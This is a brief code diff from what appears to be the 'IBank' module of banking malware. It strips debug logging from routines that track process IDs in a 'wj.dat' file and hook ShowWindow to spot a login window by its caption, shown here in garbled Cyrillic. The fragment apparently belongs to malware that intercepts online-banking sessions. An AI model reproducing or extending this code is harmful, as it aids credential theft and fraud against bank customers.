@@ -168,12 +168,10 @@ namespace IBank
 		if( GetAllUsersProfile( wjDat, sizeof(wjDat), "wj.dat" ) )
 		{
 			DWORD PID = GetUniquePID();
-			IBDBG( "IBank", "PID= %d", PID );
 			if( File::IsExists(wjDat) )
 			{
 				DWORD size;
 				DWORD* pids = (DWORD*)File::ReadToBufferA( wjDat, size );
-				IBDBG( "IBank", "size = %d", size );
 				int count = size / 4;
 
 				for( int i = 0; i < count; i++ )
@@ -206,7 +204,6 @@ namespace IBank
 	
 		char caption[128];
 		pGetWindowTextA( data->Window, caption, sizeof(caption) );
-		IBDBG( "IBank", "Hook_ShowWindow %s", caption );
 
 		if( m_strstr( caption, "¬ход в систему" ) == 0 )
 		{
